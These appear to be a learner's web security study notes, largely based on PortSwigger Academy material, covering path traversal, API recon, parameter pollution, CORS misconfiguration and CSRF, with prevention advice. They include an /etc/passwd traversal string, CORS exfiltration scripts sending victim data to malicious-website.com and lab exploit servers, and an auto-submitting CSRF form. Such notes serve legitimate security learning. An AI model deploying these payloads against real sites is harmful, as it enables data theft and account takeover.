Burp Suite
====================

Introduction
-------------

### On my Cybersecurity quest I've been given the advise to get familiar with Burp Suite, for the ability it gives to fiddle with a website and help to detect and exploit diverses vulnerabilities.

### I'll probably use a lot of the content of Portswigger Academy, the author of Burp Suite.

Path traversal
---------------

Path traversal enable an attacker to read aritrary files on the server running an application, like:

- App code, settings and data.
- Credentials for back-end and external systems.
- Sensitive OS files.

Sometimes, an offensive actor might even be able to write arbitrary files on the server, enabling application modification of data and behavior, and in the end taking full control of the system.

#### Reading arbitrary files via path traversal

An application may require the user-supplied filename to end with an expected file extension, such as .png. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example: filename=../../../etc/passwd%00.png.


API testing
------------

### To start API testing, you need first to gather as much information as possible about the API, to discover its attack surface.

#### API recon

To begin, let's identify API endpoints.
Then, let's find out

- The input data the API processes, both compulsory and optional parameters.

- The types of requests accepted, like supported HTTP methods and media formats

- The rate limits and the authentication mechanisms.

#### API documentation

APIs are usually documented. Documentation can be found in both in human-readable and machine-readable forms. It's often publicly available. If you can acces it, start the recon by reviewing the documentation.

#### Discovering API documentation

You can look if some documentation is accessible by scanning it or manual search.

look for exemple in here:

- /api
- /swagger/index.html
- openapi.json

Once identified an endpoint, investigate the base path:

- /api/swagger/v1
- /api/swagger
- /api

You can also use a list of common paths to find documentation using Intruder.

#### Machine readable documentation

You can use a range of automated tools to analyze any machine-readable API documentation that you find.

You can use Burp Scanner to crawl and audit OpenAPI documentation, or any other documentation in JSON or YAML format. You can also parse OpenAPI documentation using the OpenAPI Parser BApp.

You may also be able to use a specialized tool to test the documented endpoints, such as Postman or SoapUI.

#### Identifying API endpoints

Think also to look at the JS files, the often use API calls. You can use the JS Link Finder BApp and review the JS files directly.

#### Interacting with API endpoints

Now that you've identified endpoints, interact with them using Burp Repeater and Burp Intruder.

Investigate by exemple the API response to changing the HTTP method and media type.

Review error messages and other response closely, They can include information that you can use to construct a valid HTTP request.

You can use the built-in HTTP verbs list in Burp Intruder to automatically cycle through a range of methods.

**When testing different HTTP methods, target low-priority objects. This helps make sure that you avoid unintended consequences, for example altering critical items or creating excessive records.**

###### Identifying supported content types
###### Using Intruder to find hidden endpoints

#### Finding hidden parameters

During API recon, you may find undocumented parameters that the API supports.

You can attempt to use these to change the application's behavior. Burp includes numerous tools that can help you identify hidden parameters:

- Burp Intruder enables you to automatically discover hidden parameters, using a wordlist of common parameter names to replace existing parameters or add new parameters. Make sure you also include names that are relevant to the application, based on your initial recon.

- The Param miner BApp enables you to automatically guess up to 65,536 param names per request. Param miner automatically guesses names that are relevant to the application, based on information taken from the scope.

- The Content discovery tool enables you to discover content that isn't linked from visible content that you can browse to, including parameters.

#### Mass assignment vulnerabilities

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.

##### Identifying hidden params

Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.

For example, consider a `PATCH /api/users/` request, which enables users to update their username and email, and includes the following JSON:

```
{
    "username": "wiener",
    "email": "wiener@example.com",
}
```

A concurrent `GET /api/users/123` request returns the following JSON:

```
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```

This may indicate that the hidden `id` and `isAdmin` parameters are bound to the internal user object, alongside the updated username and email parameters.

##### Testing mass assignement vulnerabilies

#### Preventing vulnerabilities in APIs

When designing APIs, make sure that security is a consideration from the beginning. In particular, make sure that you:

- Secure your documentation if you don't intend your API to be publicly accessible.

- Ensure your documentation is kept up to date so that legitimate testers have full visibility of the API's attack surface.

- Apply an allowlist of permitted HTTP methods.

- Validate that the content type is expected for each request or response.

- Use generic error messages to avoid giving away information that may be useful for an attacker.

- Use protective measures on all versions of your API, not just the current production version.

To prevent mass assignment vulnerabilities, allowlist the properties that can be updated by the user, and blocklist sensitive properties that shouldn't be updated by the user.

#### Server-side parameter pollution

Some internal APIs aren't directly accessible from the internet.
Server side parameter pollution occurs when a website embeds user imput in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for exemple:

- Override existing parameters.
- Modify the application behavior.
- Access unauthorized data.

You can test all user input for any kind of parameter pollution.
For exemple, query parameters, form fields, headers, and URL path parameters may all be vulnerable.

> Sometimes called HTTP parameter pollution. However, this term is also used to refer to a web applicationfirewall (WAF) bypass technique. To avoid confusion, we'll refer to it only by server-side parameter pollution. Very different than server-side prototype pollution.

#### Testing for server-side parameter pollution in the query string

To test for server-side parameter pollution in the query string, place query syntax characters like #, &, and = in your input and observe how the application responds.

Consider a vulnerable application that enables you to search for other users based on their username. When you search for a user, your browser makes the following request:

```
GET /userSearch?name=peter&back=/home
```

To retrieve user information, the server queries an internal API with the following request:

```
GET /userSearch?name=peter&back=/home
```

##### Truncating query strings

You can use a URL-encoded # character to attempt to truncate the server-side request. To help you interpret the response, you could also add a string after the # character.

For example, you could modify the query string to the following:

```
GET /userSearch?name=peter%23foo&back=/home
```

The front-end will try to access the following URL:

```
GET /users/search?name=peter#foo&publicProfile=true
```


> It's essential that you URL-encode the # character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

Review the response for clues about whether the query has been truncated. For example, if the response returns the user peter, the server-side query may have been truncated. If an Invalid name error message is returned, the application may have treated foo as part of the username. This suggests that the server-side request may not have been truncated.

If you're able to truncate the server-side request, this removes the requirement for the publicProfile field to be set to true. You may be able to exploit this to return non-public user profiles.

##### Injecting invalid params

You can use an URL-encoded & character to attempt to add a second parameter to the server-side request.

For example, you could modify the query string to the following:

```
GET /userSearch?name=peter%26foo=xyz&back=/home
```

This results in the following server-side request to the internal API:

```
GET /users/search?name=peter&foo=xyz&publicProfile=true
```

Review the response for clues about how the additional parameter is parsed. For example, if the response is unchanged this may indicate that the parameter was successfully injected but ignored by the application.

To build up a more complete picture, you'll need to test further.

##### Injecting valid params

If you're able to modify the query string, you can then attempt to add a second valid parameter to the server-side request.

> For information on how to identify parameters that you can inject into the query string, see the Finding hidden parameters section.

For example, if you've identified the email parameter, you could add it to the query string as follows:

```
GET /userSearch?name=peter%26email=foo&back=/home
```

This results in the following server-side request to the internal API:

```
GET /users/search?name=peter&email=foo&publicProfile=true
```

Review the response for clues about how the additional parameter is parsed.

##### Overriding existing params

To confirm whether the application is vulnerable to server-side parameter pollution, you could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, you could modify the query string to the following:

```
GET /userSearch?name=peter%26name=carlos&back=/home
```
This results in the following server-side request to the internal API:

```
GET /users/search?name=peter&name=carlos&publicProfile=true
```

he internal API interprets two name parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:

- PHP parses the last parameter only. This would result in a user search for carlos.

- ASP.NET combines both parameters. This would result in a user search for peter,carlos, which might result in an Invalid username error message.

- Node.js / express parses the first parameter only. This would result in a user search for peter, giving an unchanged result.

If you're able to override the original parameter, you may be able to conduct an exploit. For example, you could add name=administrator to the request. This may enable you to log in as the administrator user.


Cross-Origin Resource sharing (CORS)
------------
#### Same-origin policy
#### Relaxation of the same-origin policy
##### Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='//malicious-website.com/log?key='+this.responseText;
};
```

##### Errors parsing Origin headers

Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

##### Whitelisted null origin value

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a05002a03eeb60c81451bb1008e00a4.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://exploit-0a69000603efb602816f1a6c0109009e.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
```

#### Exploiting XSS via CORS trust relationships

```
<script> document.location="http://stock.0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a6500ef0389b5e4812a5c2e00c1001b.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ad90010039ab5dc81185be9017500f3.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>
```

#### Intranet and CORS without credentials

##### Most CORS attacks rely on the presence of the response header:

```
Access-Control-Allow-Credentials: true
```

Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.

However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:

```
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://normal-website.com
```

And the server responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

##### How to prevent CORS-based attacks

CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem. The following sections describe some effective defenses against CORS attacks.

##### Proper configuration of cross-origin requests

If a web resource contains sensitive information, the origin should be properly specified in the *Access-Control-Allow-Origin* header.

##### Only allow trusted sites

It may seem obvious but origins specified in the Access-Control-Allow-Origin header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.

##### Only allow trusted sites

It may seem obvious but origins specified in the *Access-Control-Allow-Origin* header should only be sites that are trusted. In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.


##### Avoid whitelisting null

Avoid using the header *Access-Control-Allow-Origin: null*. Cross-origin resource calls from internal documents and sandboxed requests can specify the *null* origin. CORS headers should be properly defined in respect of trusted origins for private and public servers.

##### Avoid wildcards in internal networks

Avoid using wildcards in internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.


##### CORS is not a substitute for server-side security policies

CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.

Cross-site request forgery (CSRF)
----------------------------------------

### What is CSRF?

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, witch is designed to prevent different websites from interfering with each other.

### What is the impact of a CSRF attack?

In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentianlly. For example, this might be to change the email address on their account, to change their password, or to make a funds transfer. Depending on the nature of the action, the attacker might ba able to gain full control over the user's account. If the compromised user has a privileged role within the application, then the attacker might be able to take full control of all the application's data and functionality.

### How does CSRF work?

For a CSRF attack to be possible, three key conditions must be in place:

- *A relevant action.* There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as midifying parmissions for other users) or any action on user-specific data (such as changing the user's own password).

- *Cookie-based session handling.* Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.

- *No unpredictable request parameters.* The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

For example, suppose an application contains a function that lets the user change the email address on their account. When a user performs this action, they make an HTTP request like the following:

```
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

email=wiener@normal-user.com
```

This meets the conditions required for CSRF:

- The action of changing the email address on a user's account is of interest to an attacker. Following this action, the attacker will typically be able to trigger a password reset and take full control of the user's account.
- The application uses a seesion cookie to identify which user issued the request. There are no other tokens or mechanisms in place to track user sessions.
- The attacker can easily determine the values of the request parameters that are needed to perform the action.

With these conditions in place, the attacker can construct a web page containing the following HTML:

```
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

If a victim user visits the attacker's web page, the following will happen:

- The attacker's page will trigger an HTTP request to the vulnerable website.
- If the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request (assuming SameSite cookies are not being used).
- The vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.

> Although CSRF is normally described in relation to cookie-based session handling, it also arises in other contexts where the application automatically adds some user credentials to requests, such as HTTP Basic authentication and certificate-base authentication.

### How to construct a CSRF attack

Manually creating the HTML needed for a CSRF can be cumbersome, particulary where the desired request contains a large number of parameters, or there are other quirks in the request. The easiest way to construct a CSRF exploit is using the DCRF PoC generator that is built in Burp Suite Professional:

- Select a request anywhere in Burp Suite Professional that you want to test or exploit.
- From the right-click context menu, select Engagement tools/ Generate CSRF PoC
- Burp Suite will generate some HTML that will trigger ther selected request (minus cookies, which will be added automatically by the victim's browser).
- You can tweak various options in the CSRF PoC generator to fine-tune aspects of the attack. You might need to do this in some unusual situations to deal with quirky features of the requests.
- Copy the generated HTML into a web page, view it in a browser that is logged in to the vulnerable website, and test whether the intended request is issued successfully and the desired action occurs.